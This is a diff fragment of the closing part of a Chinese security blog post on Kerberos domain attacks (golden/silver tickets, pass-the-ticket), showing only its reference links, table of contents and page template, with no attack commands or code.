+<li>PTT产生的安全事件：<a class="link"   target="_blank" rel="noopener" href="https://jpcertcc.github.io/ToolAnalysisResultSheet/details/RemoteLogin-Mimikatz.htm" >https://jpcertcc.github.io/ToolAnalysisResultSheet/details/RemoteLogin-Mimikatz.htm<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.qomplx.com/qomplx-knowledge-silver-ticket-attacks-explained/" >https://www.qomplx.com/qomplx-knowledge-silver-ticket-attacks-explained/<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/desktop/SecAuthN/microsoft-kerberos" >Microsoft Kerberos<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)" >How the Kerberos Version 5 Authentication Protocol Works<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/desktop/AD/active-directory-domain-services" >Active Directory Domain Services<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="http://www.cnblogs.com/artech/archive/2011/01/24/kerberos.html" >Windows安全认证是如何进行的？Kerberos篇<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://payloads.online/archivers/2018-11-30/1" >彻底理解Windows认证<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/8127868.html" >Kerberos的黄金票据详解<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yDvICsLBOog8JTXB0643yA" >内网渗透 | Kerberos 协议与 Kerberos 认证原理<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://attack.stealthbits.com/how-golden-ticket-attack-works" >https://attack.stealthbits.com/how-golden-ticket-attack-works<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://attack.stealthbits.com/silver-ticket-attack-forged-service-tickets" >https://attack.stealthbits.com/silver-ticket-attack-forged-service-tickets<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://adsecurity.org/?p=1515" >https://adsecurity.org/?p=1515<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows/stealing-credentials/credentials-mimikatz" >https://book.hacktricks.xyz/windows/stealing-credentials/credentials-mimikatz<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets" >https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://en.hackndo.com/kerberos-silver-golden-tickets/" >https://en.hackndo.com/kerberos-silver-golden-tickets/<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：域渗透之Kerberos</li>
+        <li>Post author：ssooking</li>
+        <li>Create time：2019-12-03 14:35:00</li>
+        <li>
+            Post link：https://ssooking.github.io/2019/12/域渗透之kerberos/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">#域渗透</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2019/12/vulhub-writeup-unknowndevice64-v1/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Vulhub Writeup-unknowndevice64-v1</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2019/09/app%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E5%B7%A5%E5%85%B7/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">APP测试环境工具</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">ssooking</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%9F%9F%EF%BC%9F"><span class="nav-number">1.</span> <span class="nav-text">什么是域？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E6%A8%A1%E6%8B%9F%E7%9A%84%E8%AE%A4%E8%AF%81%E5%9C%BA%E6%99%AF"><span class="nav-number">2.</span> <span class="nav-text">一个模拟的认证场景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AE%A4%E8%AF%86Kerberos%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB"><span class="nav-number">3.</span> <span class="nav-text">认识Kerberos认证体系</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.1.</span> <span class="nav-text">Kerberos协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E4%B8%AD%E7%9A%84%E9%87%8D%E8%A6%81%E8%A7%92%E8%89%B2"><span class="nav-number">3.2.</span> <span class="nav-text">Kerberos认证体系中的重要角色</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="nav-number">3.3.</span> <span class="nav-text">基础概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="nav-number">3.4.</span> <span class="nav-text">Kerberos域认证流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kerberos%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%82%B9"><span class="nav-number">4.</span> <span class="nav-text">Kerberos认证过程中的弱点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%88Golden-Ticket%EF%BC%89"><span class="nav-number">4.1.</span> <span class="nav-text">黄金票据（Golden Ticket）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%EF%BC%88Silver-Ticket%EF%BC%89"><span class="nav-number">4.2.</span> <span class="nav-text">白银票据（Silver Ticket）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-The-Ticket-Attack"><span class="nav-number">5.</span> <span class="nav-text">Pass-The-Ticket Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">5.1.</span> <span class="nav-text">伪造黄金票据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mimikatz"><span class="nav-number">5.1.1.</span> <span class="nav-text">mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit"><span class="nav-number">5.1.2.</span> <span class="nav-text">Metasploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-number">5.2.</span> <span class="nav-text">伪造白银票据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-number">6.</span> <span class="nav-text">检测与防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">7.</span> <span class="nav-text">参考链接</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
